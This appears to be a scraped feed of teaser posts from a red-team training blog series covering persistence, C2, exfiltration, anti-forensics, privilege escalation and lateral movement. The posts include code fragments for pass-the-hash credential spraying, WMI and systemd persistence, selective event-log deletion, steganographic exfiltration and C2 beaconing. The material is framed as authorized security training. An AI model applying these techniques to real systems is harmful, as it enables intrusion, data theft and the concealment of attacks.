items.content_html:
Don't stay on Patient Zero.

You have compromised one workstation. You have dumped its credentials. But the data you want isn't on HR-PC-01; it's on the File Server, the Database, and the Domain Controller.

Most penetration tests plateau here. Professional Red Teams dominate here.

Today, we stop thinking about "exploits" and start thinking about Authentication. We are going to take the NTLM hashes we stole yesterday and use them to impersonate administrators across the entire network.

We aren't hacking anymore. We are logging in.

A Glimpse of the Code: The "Pass-the-Hash" Check

You don't need to crack a password hash to use it. The NTLM protocol accepts the hash directly.

In Day 18, we build a Lateral Movement Framework that automates the process of testing credentials against every machine on the subnet.

Here is the core logic that checks if your stolen hash gives you Admin access on a target:

def pth_smb_check(target, username, ntlm_hash, domain="."):
    """
    Pass-the-Hash via SMB using CrackMapExec.
    Returns True if the hash grants Admin access.
    """
    cmd = f"crackmapexec smb {target} -u '{username}' -H '{ntlm_hash}' -d '{domain}'"
    
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    
    if 'Pwn3d!' in result.stdout:
        print(f"[+] ADMIN ACCESS: {target}")
        return True
    elif 'STATUS_LOGON_FAILURE' in result.stdout:
        print(f"[-] Auth failed: {target}")
        return False

This script allows you to spray a single captured hash across 1,000 machines in seconds, identifying every system you now own.

Read the full guide on Medium to get:

  • WMI Lateral Movement: How to use Windows Management Instrumentation to execute silent commands on remote machines (stealthier than PSExec).

  • PSRemoting (WinRM): Using PowerShell Remoting to get interactive shells on servers without triggering RDP alerts.

  • The Target Enumerator: A script that scans the network to identify high-value targets like Domain Controllers and File Shares.

  • Linux Lateral Movement: How to reuse stolen SSH keys to pivot between Linux servers.

We have the credentials. Now we expand.

items.title: 30 Days of Red Team: Day 17 — Linux Privilege Escalation
items.summary: Stop looking for kernel exploits. Start looking for mistakes. You exploited the web app. You got a reverse shell. But you are just www-data. You can't read /etc/shadow. You can't install persistence. You are trapped. Junior hackers waste hours compiling kernel exploits that crash the…
items.content_html:
Stop looking for kernel exploits. Start looking for mistakes.

You exploited the web app. You got a reverse shell. But you are just www-data. You can't read /etc/shadow. You can't install persistence. You are trapped.

Junior hackers waste hours compiling kernel exploits that crash the server. Professionals know that Linux systems are full of misconfigurations.

Today, we learn the systematic hunt for Root. We aren't relying on luck; we are exploiting the laziness of sysadmins who leave SUID binaries, writable Cron jobs, and Docker sockets exposed.

A Glimpse of the Code: The SUID Hunter

The fastest way to root isn't a zero-day; it's a binary with the SUID bit set. If vim or find runs as root, you can spawn a shell as root.

In Day 17, we build an Automated Enumerator that scans the filesystem for these "GTFOBins" opportunities.

Here is the core logic from our enumeration tool:

def enumerate_suid_binaries(self):
    """
    Find SUID binaries - the #1 privilege escalation vector.
    These binaries execute with the owner's privileges (often Root).
    """
    print("\n[*] Searching for SUID binaries...")
    
    # Find all files with SUID permission bit (4000)
    cmd = "find / -type f -perm -4000 2>/dev/null"
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    
    suid_binaries = [line.strip() for line in result.stdout.split('\n')]
    
    # Check against known exploitable list (GTFOBins)
    gtfobins_list = ['vim', 'find', 'bash', 'awk', 'nmap', 'python']
    
    for binary in suid_binaries:
        name = os.path.basename(binary)
        if name in gtfobins_list:
            print(f"[!] CRITICAL: Exploitable SUID binary found: {binary}")
            self.findings['critical'].append(binary)

This script identifies the exact binary you need to abuse to get a root shell in seconds.

Read the full guide on Medium to get:

  • The Docker Group Exploit: How to mount the host filesystem inside a container to get instant root access without a password.

  • Cron Job Hijacking: Identifying writable scripts running as root and injecting your own payload.

  • Sudo Misconfigurations: How to abuse NOPASSWD entries in /etc/sudoers to run commands as root.

  • The "One-Command" Root Script: A Python framework that automates enumeration, exploitation, and cleanup.

We are www-data no longer. Today, we become Root.

items.title: 30 Days of Red Team: Day 15.5 — The Mid-Point Review
items.summary: Welcome back, operators. I know what you’re thinking: “Where the hell have you been?” Fair question. Here’s the truth: even red teamers unplug during the holidays. We spend time with family, eat too much food, and pretend we’re not mentally mapping the security posture of…
items.content_html:
Welcome back, operators.

I know what you’re thinking: “Where the hell have you been?”

Fair question.

Here’s the truth: even red teamers unplug during the holidays. We spend time with family, eat too much food, and pretend we’re not mentally mapping the security posture of our relatives’ home networks. It’s called balance. Look it up.

But holidays are over. The eggnog is gone. The decorations are packed away. And now? Now we get back to work.

And by “back to work,” I mean we’re about to drop a rapid-fire series of articles to catch up on the schedule. Think of it as a post-holiday content blitz. You’re about to get more red team knowledge in the next two weeks than most people learn in six months of “cybersecurity bootcamps.”

But before we dive into Day 16 proper, let’s take a breath.

Let’s look at where we’ve been. Let’s look at where we’re going. And let’s make sure you’re ready for what comes next.

Because if you thought the first 15 days were intense, you’re not ready for the second half of this series.

Where We’ve Been: Days 1–15 Recap

Let’s rewind.

Fifteen days ago, you started with nothing. No methodology. No framework. No understanding of how real attackers operate. You were standing at the beginning of the kill chain with a laptop and determination.

Today? You understand the entire attack lifecycle. You have tools. You have techniques. You have the mindset of an operator.

Here’s the journey we’ve taken together:

Week 1: Reconnaissance & Initial Access (Days 1–7)

We started at the beginning: understanding how attackers think and operate.

✅ Day 1: Understanding the Cyber Kill Chain — You learned the framework that governs every successful cyber operation. Reconnaissance, weaponization, delivery, exploitation, installation, C2, actions on objectives. You learned that red team operations aren’t random — they’re systematic.

✅ Day 2: Advanced OSINT & External Reconnaissance — You learned to gather intelligence without ever touching the target network. LinkedIn scraping, domain enumeration, technology profiling, email harvesting. You learned that reconnaissance is 80% of the operation.

✅ Day 3: Weaponization & Payload Development — You learned to craft payloads that evade detection. Shellcode generation, payload encoding, AV bypass techniques, polymorphic payloads. You learned that weaponization is an art, not a science.

✅ Day 4: Social Engineering & Delivery Mechanisms — You learned to weaponize human psychology. Phishing campaigns, pretexting, credential harvesting, landing pages. You learned that the weakest link in any security chain is the human behind the keyboard.

✅ Day 5: Initial Exploitation Techniques — You learned to get your first shell. Exploit frameworks, vulnerability exploitation, callback handling, staged vs. stageless payloads. You learned that initial access is just the beginning.

✅ Day 6: Post-Exploitation & Situational Awareness — You learned what to do immediately after getting access. System enumeration, user context assessment, network positioning, privilege identification. You learned that the first 15 minutes after exploitation determine success or failure.

✅ Day 7: Week 1 Integration & Practice — You synthesized everything from Week 1 into a complete operation. From reconnaissance to post-exploitation. You learned that theory means nothing without practice.

The Result?

You went from zero understanding to complete initial access operations. You know how to find targets, craft payloads, deliver them, exploit vulnerabilities, and establish presence.

Week 2: Persistence & Command Control (Days 8–14)

But access means nothing if you can’t keep it.

Week 2 was about survival and communication. You learned to persist on compromised systems and maintain command and control even when defenders are hunting you.

✅ Day 8: Windows Persistence Mechanisms — You learned every technique to survive on Windows. Registry Run keys, scheduled tasks, startup folders, WMI event subscriptions, service installations. You learned that persistence isn’t about one technique — it’s about redundancy.

✅ Day 9: Linux Persistence Techniques — You adapted your persistence toolkit for Linux environments. Cron jobs, systemd services, bashrc modifications, SSH key injection, library preloading. You learned that Linux persistence requires precision and stealth.

✅ Day 10: Building Custom C2 Infrastructure — You learned to build command and control from scratch. Server setup, listener configuration, handler development, communication protocols. You learned that C2 is the nervous system of any red team operation.

✅ Day 11: C2 Communication Channels — You learned to communicate without detection. HTTP/S beaconing, DNS tunneling, ICMP covert channels, domain fronting. You learned that modern C2 isn’t about hiding — it’s about blending into normal traffic.

✅ Day 12: Data Exfiltration Methods — You learned to steal data without triggering alarms. Bandwidth throttling, encrypted channels, cloud storage abuse, steganography, protocol smuggling. You learned that exfiltration is about patience, not speed.

✅ Day 13: Operational Security & Anti-Forensics — You learned to cover your tracks. Log manipulation, timestamp modification, artifact removal, memory-only execution, secure deletion. You learned that the best operations are the ones defenders never see.

✅ Day 14: Week 2 Integration & Practice — You combined persistence, C2, exfiltration, and anti-forensics into complete operational security. You learned that surviving on a network requires orchestrating multiple techniques simultaneously.

The Result?

You’re not just inside anymore. You’re entrenched. You have persistence across multiple systems. You have reliable C2 communications. You can exfiltrate data. You can cover your tracks. You’re invisible.

Week 3: Lateral Movement & Privilege Escalation (Days 15)

Week 3 is where everything changes.

This is where you learn to escalate privileges and move laterally through the network. This is where single-system compromise becomes network-wide dominance.

✅ Day 15: Credential Harvesting — You learned to extract every credential stored on compromised systems. LSASS memory dumping, SAM database extraction, registry credential theft, browser password harvesting. You learned that credentials are the keys to the kingdom.

Currently In Progress…

You’ve completed the foundation. You understand initial access, persistence, and C2. You know how to operate without detection. You’ve just learned to harvest credentials.

Now comes the hard part: escalation and lateral movement.

What You Should Have By Now

Let’s do an inventory check.

If you’ve been following along, here’s what you should have in your red team toolkit after 15 days:

Week 1 Skills — Reconnaissance & Initial Access:

  • Complete understanding of the Cyber Kill Chain framework
  • OSINT collection tools and methodologies
  • Payload development and weaponization techniques
  • Social engineering infrastructure (phishing, pretexting, credential harvesting)
  • Initial exploitation capabilities
  • Post-exploitation enumeration and situational awareness procedures

Week 2 Skills — Persistence & Command Control:

  • Windows persistence mechanisms (10+ techniques)
  • Linux persistence techniques (10+ techniques)
  • Custom C2 infrastructure
  • Multiple C2 communication channels (HTTP/S, DNS, ICMP)
  • Data exfiltration methods across multiple protocols
  • Operational security and anti-forensics capabilities

Week 3 Skills — Credential Harvesting:

  • LSASS memory dumping tools
  • SAM database extraction techniques
  • Registry credential harvesting
  • Browser password extraction
  • Credential processing and cracking capabilities

If you’re missing any of these, go back. Seriously. The second half of Week 3 and all of Week 4 build on everything we’ve done so far.

Where We’re Going: Days 16–30 Preview

Alright, let’s talk about what’s coming.

The first 15 days were about getting in, staying in, and stealing credentials.

The next 15 days are about complete network compromise and domain dominance.

Here’s what’s coming:

Week 3 (Continued): Lateral Movement & Privilege Escalation (Days 16–21)

  • Day 16: Windows Privilege Escalation — Tomorrow, you’ll learn to escalate from user to admin to SYSTEM. Unquoted service paths, weak permissions, DLL hijacking, token manipulation, UAC bypasses. You’ll learn that Windows privilege escalation is a science.
  • Day 17: Linux Privilege Escalation — You’ll adapt your escalation skills to Linux. SUID binaries, kernel exploits, sudo misconfigurations, capabilities abuse, cron exploitation. You’ll learn that Linux escalation rewards patience and precision.
  • Day 18: Lateral Movement Techniques — You’ll learn to move through networks like a ghost. Pass-the-Hash, WMI execution, PSRemoting, DCOM exploitation. You’ll learn that lateral movement is about stealth, not noise.
  • Day 19: Pivoting & Network Tunneling — You’ll learn to reach previously unreachable networks. SSH tunneling, SOCKS proxies, port forwarding, network segmentation bypass. You’ll learn that pivoting turns isolated systems into network highways.
  • Day 20: Exploiting Trust Relationships — You’ll learn to abuse the trust that makes enterprise networks function. Forest trusts, domain trusts, SQL Server links, certificate authorities. You’ll learn that trust is the weakest link in enterprise security.
  • Day 21: Week 3 Integration & Practice — You’ll combine credential harvesting, privilege escalation, lateral movement, and pivoting into complete network compromise operations. You’ll learn to think like an APT operator.

Week 4: Active Directory & Domain Dominance (Days 22–28)

This is where everything we’ve built leads to.

  • Day 22: Active Directory Enumeration — You’ll learn to map Active Directory like a professional. Users, groups, computers, OUs, GPOs, ACLs, trusts. You’ll learn that AD enumeration reveals the entire enterprise architecture.
  • Day 23: Kerberoasting & AS-REP Roasting — You’ll learn to extract and crack service account credentials. Kerberoasting attacks, AS-REP roasting, targeted SPN hunting. You’ll learn that Kerberos authentication is a credential goldmine.
  • Day 24: Pass-the-Ticket & Overpass-the-Hash — You’ll learn to move laterally without passwords. TGT extraction, TGT injection, RC4 to AES conversion. You’ll learn that Kerberos tickets are better than passwords.
  • Day 25: Golden & Silver Tickets — You’ll learn to forge Kerberos tickets. Golden Ticket attacks for domain persistence, Silver Ticket attacks for service access. You’ll learn that with the right key, you can impersonate anyone.
  • Day 26: DCSync & Domain Admin Compromise — You’ll learn to steal every credential in the domain. DCSync attacks, NTDS.dit extraction, replication abuse. You’ll learn that Domain Admin isn’t the goal — it’s the beginning of total control.
  • Day 27: Persistence at Domain Level — You’ll learn to maintain access at the domain level. AdminSDHolder abuse, DCShadow, Skeleton Keys, DSRM backdoors. You’ll learn that domain-level persistence is invisible and nearly impossible to remove.
  • Day 28: Week 4 Integration & Practice — You’ll orchestrate complete domain compromise operations from reconnaissance to domain admin to persistence. You’ll learn to operate like an advanced persistent threat.

Week 5: Advanced Topics & Wrap-Up (Days 29–30)

  • Day 29: Advanced Evasion & Detection Bypass — You’ll learn to evade modern security controls. EDR bypass, AMSI evasion, logging disruption, behavioral detection avoidance. You’ll learn that the best operators know exactly how defenders see them.
  • Day 30: Series Wrap-Up & Building Your Career — You’ll learn what comes next. Certifications, career paths, continued learning, portfolio building, professional development. You’ll learn that Day 30 isn’t the end — it’s the beginning of your red team career.

The Second Half Gets Real

Let me be honest with you.

The first two weeks were designed to build your foundation. They were challenging, but they were structured. We built tools, we tested them, we learned the basics of operations.

Week 3 is where things change.

Week 3 assumes you have the foundation. You understand how to gain access, maintain persistence, and operate with stealth. Now we escalate. Now we move laterally. Now we compromise entire networks.

If you struggled with Weeks 1–2, now is the time to catch up. Go back. Review. Practice. Test your tools in a lab environment.

If you crushed Weeks 1–2, you’re ready. Week 3 will push you into territory most penetration testers never reach. You’ll learn techniques that separate professionals from script kiddies.

Week 4 — Active Directory Dominance — is where legends are made.

By Day 28, you’ll understand Active Directory attacks at a level that makes you dangerous. You’ll know how to enumerate, attack, and persist in AD environments. You’ll understand Kerberos exploitation, ticket forgery, and domain compromise.

Week 5 wraps it all together with advanced evasion and career guidance.

What’s Next: Rapid-Fire Content Schedule

Here’s the plan:

Over the next two weeks, I’ll be posting back-to-back articles to catch up on the schedule. Expect 3–4 articles per week until we’re back on track.

Each article will maintain the same depth, detail, and quality you’ve come to expect. I’m not rushing the content — I’m just accelerating the release schedule.

The schedule:

  • Day 16: Windows Privilege Escalation (drops tomorrow)
  • Day 17: Linux Privilege Escalation
  • Day 18: Lateral Movement Techniques
  • Day 19: Pivoting & Network Tunneling
  • Day 20: Exploiting Trust Relationships
  • Day 21: Week 3 Integration & Practice

Then we hit Week 4 — Active Directory week. This is what everything has been building toward.

A Note on Ethics (Because It Matters)

Before we continue, let’s be clear:

Everything in this series is designed for authorized security testing only.

You should be testing these techniques in:

  • Your own lab environment
  • Environments you have explicit written permission to test
  • Red team engagements with signed contracts and rules of engagement

If you use these techniques without authorization, you’re not a red teamer. You’re a criminal. And you’ll be treated as one.

The goal of this series is to create skilled, ethical security professionals who can think like attackers to better defend organizations. If that’s not your goal, this series isn’t for you.

Final Thoughts: The Journey Continues

Fifteen days ago, you started this journey with nothing.

Today, you have a toolkit that most penetration testers would envy. You understand the complete attack lifecycle. You have the mindset of an operator.

But we’re only halfway done.

The next 15 days will take everything you’ve learned and push it further. You’ll learn to escalate privileges on any system. You’ll move laterally through networks invisibly. You’ll compromise entire Active Directory domains.

By Day 30, you’ll have completed one of the most comprehensive red team education programs ever published publicly.

But only if you keep going.

The holiday break is over. The foundation phase is over. The real work begins now.

Homework Before Day 16

Before we dive into Day 16, make sure you have:

✅ Reviewed Days 1–15 — Go back through the articles. Make sure you understand the concepts. Test your tools.

✅ Set up a Windows lab environment — Days 16–21 focus heavily on Windows and AD. You’ll need a lab with at least 2–3 Windows machines. Bonus: Set up a domain controller for Week 4 prep.

✅ Organized your toolkit — Put all your scripts, tools, and notes in one place. Create a structured directory for your red team operations.

✅ Prepared for acceleration — The next two weeks will be intense. Block out time to read, practice, and implement. This is going to be a sprint to catch up.

✅ Got your credentials from Day 15 ready — The credentials you harvested on Day 15 are the foundation for privilege escalation on Day 16. Make sure you have working credential harvesting tools.

What’s Next: Day 16 Tomorrow

Tomorrow, we escalate.

Day 16: Windows Privilege Escalation

You’ll learn to escalate from low-privileged user to SYSTEM on Windows:

  • Unquoted service paths and weak permissions exploitation
  • DLL hijacking and search order abuse
  • Token manipulation and privilege escalation
  • UAC bypass techniques
  • AlwaysInstallElevated and other misconfigurations
  • Automated privilege escalation enumeration tools
  • Building your own privilege escalation framework

You’ll build tools that systematically identify and exploit every common Windows privilege escalation vector. You’ll learn to combine credential harvesting with privilege escalation into complete system compromise.

This is where the credentials you harvested on Day 15 become domain admin access.

This is where you stop being a user and become SYSTEM.

Day 16 drops tomorrow.

Be ready.

— Maxwell Cross

P.S. — If you’ve been following along, thank you. I know these articles are long. I know they’re dense. I know the holiday break probably had you wondering if the series was dead. It’s not. We’re just getting started.

The next 15 days will be the most valuable red team education you’ve ever received. Every article. Every tool. Every technique.

Don’t waste it.

See you tomorrow.

Stay Connected

Follow @MaxwellCross here on Medium for deep technical dives into:

  • Custom C2 infrastructure
  • Red team tooling
  • Evasion tactics
  • Offensive Python, Rust, and Go development

items.title: 30 Days of Red Team: Day 14 — The Ops Framework
items.summary: Individual skills don't win engagements. You’ve spent Week 2 learning specific tactics: Persistence, C2, Exfiltration, and Anti-Forensics. Each skill is powerful on its own. But here is the harsh reality: An operator who can establish persistence but can’t exfiltrate data is useless. Real Red Team…
items.content_html:
Individual skills don't win engagements.

You’ve spent Week 2 learning specific tactics: Persistence, C2, Exfiltration, and Anti-Forensics. Each skill is powerful on its own.

But here is the harsh reality: An operator who can establish persistence but can’t exfiltrate data is useless.

Real Red Team operations aren't about running tools in isolation. They are about Integration. Today, we take every script we've written over the last 13 days and fuse them into a cohesive Operational Framework.

This is the difference between knowing how to hack and knowing how to conduct an Operation.

A Glimpse of the Code: The Operations Engine

We are moving past simple scripts. We need an engine that handles the logic of an attack campaign automatically.

In Day 14, we build the Ops Framework that manages the lifecycle of an intrusion. Here is the logic that ensures redundancy by deploying multiple persistence methods immediately upon access:

class OperationalWorkflow:
    def establish_resilient_access(self, shell):
        """
        The 'First 10 Minutes' Protocol.
        Automatically deploys redundancy to ensure we never lose the shell.
        """
        # Step 1: Deploy 3 distinct persistence methods
        persistence_methods = [
            "registry_run_key",       # Fast
            "scheduled_task",         # Reliable
            "wmi_event_subscription"  # Stealthy
        ]
        
        for method in persistence_methods:
            self.deploy_persistence(shell, method)
            # Sleep to avoid behavioral detection
            self.opsec_sleep(60, 180) 
            
        # Step 2: Establish Primary and Fallback C2
        self.establish_c2(shell, channel="https") 
        self.establish_c2(shell, channel="dns")   
        
        return True

This script ensures that if the Blue Team burns one access method, you have two more waiting in the wings.

Read the full guide on Medium to get:

  • The "Zero to Domain Admin" Scenario: A step-by-step walkthrough of a 3-hour simulated attack using our custom tools.

  • Blue Team Defense Lab: How to set up Splunk and Sysmon to test your own tools against enterprise-grade monitoring.

  • The Master Checklist: A printable 50-point checklist used by professional Red Teams to ensure no artifact is left behind.

Week 2 is complete. You have the infrastructure. Next week, we start hunting for credentials.

items.title: 30 Days of Red Team: Day 13 — Anti-Forensics
items.summary: You have the prize. Now, can you get away with it? You’ve compromised the target. You’ve exfiltrated the data. You feel like you’ve won. But while you are celebrating, the Blue Team is spinning up a forensic investigation. They are pulling disk images, analyzing memory…
items.content_html:
You have the prize. Now, can you get away with it?

You’ve compromised the target. You’ve exfiltrated the data. You feel like you’ve won.

But while you are celebrating, the Blue Team is spinning up a forensic investigation. They are pulling disk images, analyzing memory dumps, and correlating timestamps. If you left a single artifact behind, the entire operation burns.

Amateurs clear the logs (which triggers Event ID 1102 and alerts the SOC). Professionals perform Surgical Deletion—removing only their own traces while leaving the rest of the system untouched.

Today, we learn how to disappear.

A Glimpse of the Code: Surgical Log Cleaning

Running Clear-EventLog is suicide. It screams "I was here!" to any SIEM.

In Day 13, we build a Log Manipulator that parses the binary .evtx files directly. It locates the specific Event IDs generated by your malware (like Process Creation 4688) and unlinks them from the chain without breaking the file structure.

Here is the logic that edits history:

def selective_delete_events(log_path, target_event_ids):
    """
    Remove specific Event IDs without clearing the entire log.
    This avoids triggering Event 1102 (The audit log was cleared).
    """
    parser = evtx.Evtx(log_path)
    clean_records = []
    
    # Iterate through all event records
    for record in parser.records():
        event_id = record.event_id()
        
        # Keep events that aren't in our target list
        if event_id not in target_event_ids:
            clean_records.append(record)
            
    # Rebuild log file with filtered records
    rebuild_evtx_file(log_path, clean_records)

To the forensic analyst, the logs look continuous. The only thing missing is you.

Read the full guide on Medium to get:

  • Timestamp Stomping: How to modify your malware's $MFT attributes to match legitimate system files (e.g., making your backdoor look like it was installed in 2019).

  • Secure Deletion: A script that implements the DoD 5220.22-M standard to overwrite files 7 times, rendering them unrecoverable by forensic tools.

  • Memory-Only Execution: How to run your tools entirely in RAM so that if the server is pulled, your evidence vanishes instantly.

  • The "Dead Man" Switch: A cleanup script that automatically wipes your tracks if you lose connection to the C2.

We got in. We got the data. Now, let's make sure they never know we were there.

items.title: 30 Days of Red Team: Day 12 — Data Exfiltration
items.summary: Access means nothing if you can't get the data out. You have Domain Admin. You have the persistence. You have the Crown Jewels. But if you try to drag-and-drop 50GB of data across the network, you will trigger every alarm in the Security Operations Center…
items.content_html:
Access means nothing if you can't get the data out.

You have Domain Admin. You have the persistence. You have the Crown Jewels.

But if you try to drag-and-drop 50GB of data across the network, you will trigger every alarm in the Security Operations Center (SOC).

Amateurs think exfiltration is about speed. Professionals know it is about Invisibility.

Today, we learn how to move data past Firewalls, IDS, and Data Loss Prevention (DLP) systems by breaking it into microscopic chunks and hiding it where defenders never look.

A Glimpse of the Code: Steganography

DLP systems scan for keywords like "Confidential" or file types like .sql. They don't look inside your vacation photos.

In Day 12, we build a Steganography Toolkit that hides sensitive data inside the pixels of an image using Least Significant Bit (LSB) encoding.

Here is the logic that turns a JPEG into a data mule:

def encode_data(self, image_path, data, output_path):
    """
    Hide data inside an image using LSB encoding.
    This modifies the last bit of each pixel, making the change 
    invisible to the human eye but readable by our C2.
    """
    # Load image as pixel array
    img = Image.open(image_path)
    img_array = np.array(img)
    
    # Flatten image and encode data into LSBs
    flat_img = img_array.flatten()
    for i, bit in enumerate(binary_data):
        # Modify only the last bit (0xFE mask)
        flat_img[i] = (flat_img[i] & 0xFE) | int(bit)
        
    # Reshape and save as a new image
    result = Image.fromarray(flat_img.reshape(img_array.shape))
    result.save(output_path)

To the DLP, it's a picture of a beach. To you, it's the entire customer database.

Read the full guide on Medium to get:

  • The DNS Exfiltration Engine: How to tunnel data through DNS queries (which almost no firewall blocks).

  • Cloud Exfiltration: Using legitimate services like AWS S3 and Google Drive to blend your theft with normal business traffic.

  • The "Chunker": A script that splits massive files into tiny, unnoticeable packets and reassembles them on your C2 server.

  • Bandwidth Throttling: How to programmatically limit your transfer speed to stay below the "Anomaly Detection" threshold.

We have the data. Now, let's steal it without leaving a trace.

items.title: 30 Days of Red Team: Day 11 — Alternative C2 Channels
items.summary: Your primary channel just died. Now what? Yesterday, you built a robust HTTP C2 server. It works great—until the Blue Team updates the firewall rules, blocks your IP, or flags your SSL certificate. In a real engagement, if you rely on a single communication channel,…
items.content_html:
Your primary channel just died. Now what?

Yesterday, you built a robust HTTP C2 server. It works great—until the Blue Team updates the firewall rules, blocks your IP, or flags your SSL certificate.

In a real engagement, if you rely on a single communication channel, you are one firewall change away from failure.

Today, we build the backup plans. We are coding a Multi-Protocol Agent that doesn't just rely on web traffic. If HTTP fails, it tunnels through DNS. If DNS fails, it hides inside AWS S3 buckets. If that fails, it posts commands to a private Discord server.

We are building the unblockable implant.

A Glimpse of the Code: Automatic Failover

The difference between a script and a professional implant is logic. We don't manually switch protocols; the agent does it automatically when it senses a block.

Here is the logic from the Multi-Protocol Agent we build in the full article:

class MultiProtocolAgent:
    def find_working_protocol(self):
        """
        Automatic C2 Failover Logic.
        Tries protocols in order of stealth and speed.
        """
        # 1. Try HTTP (Fastest)
        # 2. Try DNS (Stealthiest)
        # 3. Try Cloud/AWS (Most Legitimate)
        # 4. Try Discord (Hardest to Block)
        
        for protocol in ['http', 'dns', 'cloud', 'discord']:
            if protocol not in self.failed_protocols:
                print(f"[*] Testing protocol: {protocol}...")
                if self.try_protocol(protocol):
                    self.current_protocol = protocol
                    print(f"[+] Failover successful. Using: {protocol}")
                    return True
                    
        print("[!] All channels blocked. Entering deep sleep.")
        return False

This script ensures that even if the SOC blocks port 443, you still have a shell.

Read the full guide on Medium to get:

  • DNS C2: How to tunnel commands and data through DNS TXT records (the protocol that is almost never blocked).

  • Social Media C2: A full guide to using Discord Bots and Telegram as your command infrastructure.

  • Cloud-Based C2: Hiding your traffic inside legitimate AWS S3 or Azure Blob storage requests so it blends in with corporate traffic.

  • ICMP C2: Using raw Ping packets to send commands when no TCP/UDP ports are open.

  • Domain Generation Algorithms (DGA): How to dynamically generate new C2 domains daily so you can't be blacklisted.

We have the Persistence (Week 2). We have the Brains (Day 10). Now we have the Resilience.

items.content_html:
Persistence is useless if you are blind.

You have spent two days ensuring your malware survives a reboot. But here is the brutal truth: if your reverse shell dies and you have no way to reconnect, you are dead in the water.

Commercial tools like Cobalt Strike and Metasploit are powerful, but they have a fatal flaw: Signatures. Every EDR on the planet knows what they look like.

Today, we stop relying on other people's tools. We are building a Custom Command & Control (C2) infrastructure from scratch. It has no signatures, it uses custom encryption, and it is the only way to operate under the nose of a hunting team.

A Glimpse of the Code: The C2 Brain

A C2 server needs to be more than just a listener; it needs to be a task manager.

In Day 10, we build a Flask-based server that handles encrypted "Beacons" from our agents. Here is the core logic that processes a check-in without alerting the firewall:

@self.app.route('/api/v1/sync', methods=['POST'])
def beacon():
    """
    Handle agent beacon check-ins.
    1. Decrypts the incoming heartbeat.
    2. Identifies the session (Window/Linux).
    3. Checks the database for pending commands (Tasks).
    """
    encrypted = request.json.get('data')
    payload = self.decrypt_data(encrypted)
    
    if not payload:
        return jsonify({'status': 'error'}), 400
    
    # Get pending tasks for this agent
    tasks = self.get_pending_tasks(payload.get('session_id'))
    
    return jsonify({
        'status': 'success',
        'data': self.encrypt_data({'tasks': tasks})
    })

This architecture separates the "Brains" (Server) from the "Muscle" (Agent), allowing you to manage hundreds of compromised systems simultaneously.

Read the full guide on Medium to get:

  • The Full Source Code: A complete, working C2 framework including the Server (Python) and Agents (PowerShell/Bash).

  • The "Jitter" Principle: How to randomize your beacon intervals so your traffic looks like web browsing, not malware.

  • Encryption Standards: Why HTTPS isn't enough, and how to implement AES-256 application-layer encryption.

  • The Payload Generator: A script that automatically builds and obfuscates your implants for instant deployment.

We have the persistence. Now we have the lifeline.

items.content_html:
Windows has the Registry. Linux has Everything Else.

Yesterday, we hid inside the Windows Registry. Today, we enter the world of Linux, where "everything is a file"—including your malware.

If you think Linux persistence is just adding a Cron job and calling it a day, you are going to get caught. Modern Linux environments (especially in the cloud) are heavily monitored. To survive reboots and rm -rf commands, you need to understand the boot process better than the sysadmin does.

Today, we cover the art of staying root.

A Glimpse of the Code: Systemd Persistence

Cron is noisy. Systemd is professional.

Systemd manages services on almost every modern Linux distro. By creating a custom user service, we can ensure our payload restarts automatically if it crashes or is killed. Here is the logic from the Systemd Persistence Tool we build in the full article:

def create_user_service(service_name, payload_command):
    """
    Create a systemd user service that survives reboots (no root required).
    """
    service_content = f"""[Unit]
Description=User background synchronization service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c '{payload_command}'
Restart=always
RestartSec=30

[Install]
WantedBy=default.target
"""
    # Write to ~/.config/systemd/user/ and enable lingering
    # "Lingering" ensures the service runs even when the user is logged out.
    subprocess.run(f'loginctl enable-linger {os.getenv("USER")}', shell=True)

This technique allows your persistence to survive even when the user logs out, effectively turning a low-privilege user account into a permanent foothold.

Read the full guide on Medium to get:

  • The Cron Framework: How to install stealthy Cron jobs that blend in with system tasks (and how to hide them from casual inspection).

  • SSH Key Injection: A script to generate backdoor SSH keys and inject them into authorized_keys without leaving a command history trail.

  • Shell Profile Poisoning: How to modify .bashrc and .profile so your payload executes every time an admin logs in to check the server.

  • The Master Linux Framework: A Python tool that detects your privileges (Root vs. User) and automatically installs the best available persistence method.

We own the server. Now, let's make sure we keep it.

items.content_html:
Getting in is hard. Getting locked out is easy.

You spent Week 1 learning how to hack. You reconned the target, weaponized a payload, and popped a shell. You feel like a genius.

Then the user reboots their computer.

Your connection dies. Your shell is gone. And because you didn't establish Persistence, you have to start over from scratch.

Today, we begin Week 2 by ensuring that never happens. We are building the tools to survive reboots, logoffs, and even active hunting by the Blue Team.

A Glimpse of the Code: WMI Event Subscriptions

Amateurs put a batch file in the Startup folder. Professionals use WMI.

Windows Management Instrumentation (WMI) allows us to create "fileless" persistence that never touches the disk and doesn't show up in the Registry. Here is the core logic for binding a malicious payload to a system event:

def create_wmi_persistence(self, payload_command, event_name):
    """
    Creates WMI event subscription for stealthy persistence.
    1. Filter: Defines WHEN to trigger (e.g., system uptime > 2 min)
    2. Consumer: Defines WHAT to run (our payload)
    3. Binding: Connects them together
    """
    ps_script = f'''
    # 1. Event Filter
    $FilterArgs = @{{
        name='_{event_name}_Filter';
        EventNameSpace='root\\CimV2';
        Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 
               WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
    }};
    
    # 2. Event Consumer
    $ConsumerArgs = @{{
        name='_{event_name}_Consumer';
        CommandLineTemplate="{payload_command}"
    }};
    
    # 3. Binding
    New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding ...
    '''
    return ps_script

This script buries your access deep within the Windows operating system, making it incredibly difficult to detect without specialized forensic tools.

Read the full guide on Medium to get:

  • The Registry Framework: 8 different methods to hook into the Windows Registry, including "Image File Execution Options" (IFEO) hijacking.

  • Smart Scheduled Tasks: How to create tasks that trigger not just on time, but on specific events like User Logon or System Idle.

  • Service Wrapper: A tool to run your malware as a legitimate background service with SYSTEM privileges.

  • The Master Persistence Script: A "Nuclear Option" script that installs 7 layers of persistence simultaneously to guarantee you never lose access.

The Golden Rule of Persistence: Always establish two doors. Today, we build them.
